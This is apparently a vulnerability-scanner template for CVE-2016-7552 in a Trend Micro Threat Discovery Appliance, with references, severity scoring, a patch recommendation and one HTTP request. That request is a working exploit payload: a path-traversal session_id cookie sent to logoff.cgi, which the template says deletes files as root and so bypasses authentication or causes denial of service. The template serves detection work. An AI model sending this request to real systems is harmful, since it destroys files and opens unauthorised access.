id: CVE-2016-7552
info:
  name: Trend Micro Threat Discovery Appliance 2.6.1062r1 - Authentication Bypass
  author: dwisiswant0
  severity: critical
  description: The CVE-2016-7552 vulnerability in Trend Micro Threat Discovery Appliance
    2.6.1062r1 allows unauthenticated attackers to delete files and potentially bypass
    authentication or cause a DoS attack.
  reference:
  - https://gist.github.com/malerisch/5de8b408443ee9253b3954a62a8d97b4
  - https://nvd.nist.gov/vuln/detail/CVE-2016-7552
  - https://github.com/rapid7/metasploit-framework/pull/8216/commits/0f07875a2ddb0bfbb4e985ab074e9fc56da1dcf6
  - http://web.archive.org/web/20210516181625/https://www.securityfocus.com/bid/97599
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2016-7552
    cwe-id: CWE-22
  tags: msf,cve,cve2016,lfi,auth,bypass
  metadata:
    impact: The impact of CVE-2016-7552 on Trend Micro Threat Discovery Appliance
      2.6.1062r1 is the ability for remote, unauthenticated attackers to delete arbitrary
      files as root which can lead to authentication bypass or a DoS.
    recommendation: It is highly recommended to update Trend Micro Threat Discovery
      Appliance to a patched version in order to prevent exploitation of CVE-2016-7552's
      authentication bypass vulnerability.
requests:
- method: GET
  path:
  - '{{BaseURL}}/cgi-bin/logoff.cgi'
  headers:
    Cookie: session_id=../../../opt/TrendMicro/MinorityReport/etc/igsa.conf
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    words:
    - Memory map
    part: body
